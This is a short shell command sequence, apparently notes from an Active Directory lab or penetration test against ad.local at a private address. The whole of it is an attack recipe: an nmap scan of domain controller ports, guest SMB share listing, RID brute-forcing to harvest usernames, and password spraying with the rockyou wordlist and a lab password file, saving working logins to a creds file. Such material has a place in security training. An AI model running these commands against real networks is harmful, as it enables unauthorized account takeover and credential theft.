```sh
nmap --privileged -A -v -oA nmap_scan1 -vvv -p 53,135,139,389,445,464,593,3268,88,5985,9389,49666,49667,49673,49674,49675,49677,49692,50375 ad.local
 
 
crackmapexec smb 192.168.56.3 -u guest -p '' --shares
  
  

crackmapexec smb 192.168.56.3 -u guest -p '' --rid-brute
crackmapexec smb 192.168.56.3 -u guest -p '' --rid-brute > users1
cat users1 | grep SidTypeUser | awk -F ' ' '{print $6}' | awk -F '\' '{print $2}' > users.txt



crackmapexec smb ad.local -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success 
cat Lab_setup/out.json | grep password | awk -F '"' '{print $4}' > pass.txt


crackmapexec smb ad.local -u users.txt -p pass.txt --continue-on-success | grep [+] | awk -F ' ' '{print $6}' | awk -F '\' '{print $2}' > creds

```
